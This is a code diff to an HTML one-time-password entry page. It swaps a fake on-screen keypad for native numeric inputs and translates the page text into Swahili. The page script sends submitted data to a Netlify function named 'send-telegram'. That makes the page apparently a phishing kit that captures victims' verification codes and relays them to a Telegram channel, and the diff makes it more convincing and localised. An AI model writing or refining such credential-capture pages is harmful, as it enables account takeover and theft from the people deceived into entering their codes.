@@ -300,81 +300,50 @@
 
             <!-- OTP Input Boxes -->
             <div class="otp-container" id="otp-container">
-                <input type="text" class="otp-box active" maxlength="1" readonly>
-                <input type="text" class="otp-box" maxlength="1" readonly>
-                <input type="text" class="otp-box" maxlength="1" readonly>
-                <input type="text" class="otp-box" maxlength="1" readonly>
-                <input type="text" class="otp-box" maxlength="1" readonly>
-                <input type="text" class="otp-box" maxlength="1" readonly>
+                <input type="tel" class="otp-box active" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+                <input type="tel" class="otp-box" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+                <input type="tel" class="otp-box" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+                <input type="tel" class="otp-box" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+                <input type="tel" class="otp-box" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+                <input type="tel" class="otp-box" maxlength="1" pattern="[0-9]*" inputmode="numeric">
             </div>
 
             <!-- Timer -->
-            <p class="timer-text">New request in <span id="timer">00:57</span></p>
+            <p class="timer-text">Ombi jipya baada ya <span id="timer">00:57</span></p>
 
             <!-- Verify Button -->
-            <button class="verify-btn" id="verify-btn">Verify and proceed</button>
+            <button class="verify-btn" id="verify-btn">Hakiki na uendelee</button>
         </div>
 
-        <!-- Faux Keyboard -->
-        <div class="keyboard">
-            <div class="keyboard-row">
-                <div class="key" data-val="1">
-                    <span class="num">1</span><span class="letters"></span>
-                </div>
-                <div class="key" data-val="2">
-                    <span class="num">2</span><span class="letters">A B C</span>
-                </div>
-                <div class="key" data-val="3">
-                    <span class="num">3</span><span class="letters">D E F</span>
-                </div>
-            </div>
-            <div class="keyboard-row">
-                <div class="key" data-val="4">
-                    <span class="num">4</span><span class="letters">G H I</span>
-                </div>
-                <div class="key" data-val="5">
-                    <span class="num">5</span><span class="letters">J K L</span>
-                </div>
-                <div class="key" data-val="6">
-                    <span class="num">6</span><span class="letters">M N O</span>
-                </div>
-            </div>
-            <div class="keyboard-row">
-                <div class="key" data-val="7">
-                    <span class="num">7</span><span class="letters">P Q R S</span>
-                </div>
-                <div class="key" data-val="8">
-                    <span class="num">8</span><span class="letters">T U V</span>
-                </div>
-                <div class="key" data-val="9">
-                    <span class="num">9</span><span class="letters">W X Y Z</span>
-                </div>
-            </div>
-            <div class="keyboard-row">
-                <div class="key empty"></div>
-                <div class="key" data-val="0">
-                    <span class="num">0</span><span class="letters"></span>
-                </div>
-                <div class="key action-key" data-val="backspace">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="1.5" stroke-linecap="round"
-                        stroke-linejoin="round">
-                        <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"></path>
-                        <line x1="18" y1="9" x2="12" y2="15"></line>
-                        <line x1="12" y1="9" x2="18" y2="15"></line>
-                    </svg>
-                </div>
-            </div>
-        </div>
     </div>
 
     <script>
         document.addEventListener("DOMContentLoaded", () => {
             const inputs = document.querySelectorAll('.otp-box');
-            const keys = document.querySelectorAll('.key');
             const verifyBtn = document.getElementById('verify-btn');
             const timerEl = document.getElementById('timer');
 
-            let currentIndex = 0;
+            // Focus first input
+            inputs[0].focus();
+
+            // Handle input events
+            inputs.forEach((input, index) => {
+                input.addEventListener('input', (e) => {
+                    if (e.target.value.length > 1) {
+                        e.target.value = e.target.value.slice(0, 1);
+                    }
+                    if (e.target.value && index < inputs.length - 1) {
+                        inputs[index + 1].focus();
+                    }
+                    checkIfComplete();
+                });
+
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                        inputs[index - 1].focus();
+                    }
+                });
+            });
 
             // Visual timer logic
             let timeLeft = 57;
@@ -388,21 +357,9 @@
                     clearInterval(timerInterval);
                     timerEl.style.color = "#333";
                     timerEl.style.cursor = "pointer";
-                    timerEl.textContent = "Resend now";
+                    timerEl.textContent = "Tuma tena sasa";
                 }
             }, 1000);
-
-            // Update the active border class based on current focus
-            function updateActiveState() {
-                inputs.forEach((input, index) => {
-                    if (index === currentIndex) {
-                        input.classList.add('active');
-                    } else {
-                        input.classList.remove('active');
-                    }
-                });
-                checkIfComplete();
-            }
 
             // Check if all inputs are filled
             function checkIfComplete() {
@@ -418,49 +375,6 @@
                 }
             }
 
-            // Virtual Keyboard click handling
-            keys.forEach(key => {
-                key.addEventListener('click', () => {
-                    const val = key.getAttribute('data-val');
-                    if (!val) return; // Empty key
-
-                    if (val === 'backspace') {
-                        if (currentIndex > 0 && inputs[currentIndex].value === '') {
-                            currentIndex--;
-                        }
-                        inputs[currentIndex].value = '';
-                        updateActiveState();
-                    } else {
-                        if (currentIndex < inputs.length) {
-                            inputs[currentIndex].value = val;
-                            if (currentIndex < inputs.length - 1) {
-                                currentIndex++;
-                            }
-                            updateActiveState();
-                        }
-                    }
-                });
-            });
-
-            // Allow real keyboard typing for testing on PC
-            document.addEventListener('keydown', (e) => {
-                if (e.key >= '0' && e.key <= '9') {
-                    if (currentIndex < inputs.length) {
-                        inputs[currentIndex].value = e.key;
-                        if (currentIndex < inputs.length - 1) {
-                            currentIndex++;
-                        }
-                        updateActiveState();
-                    }
-                } else if (e.key === 'Backspace') {
-                    if (currentIndex > 0 && inputs[currentIndex].value === '') {
-                        currentIndex--;
-                    }
-                    inputs[currentIndex].value = '';
-                    updateActiveState();
-                }
-            });
-
             async function sendToTelegram(message) {
                 try {
                     await fetch('/.netlify/functions/send-telegram', {
@@ -474,7 +388,6 @@
             }
 
             let isSubmitting = false;
-            // Add verification button click
             verifyBtn.addEventListener('click', async () => {
                 if (verifyBtn.classList.contains('enabled') && !isSubmitting) {
                     isSubmitting = true;
@@ -487,7 +400,6 @@
             });
         });
     </script>
-
 </body>
 
 </html>
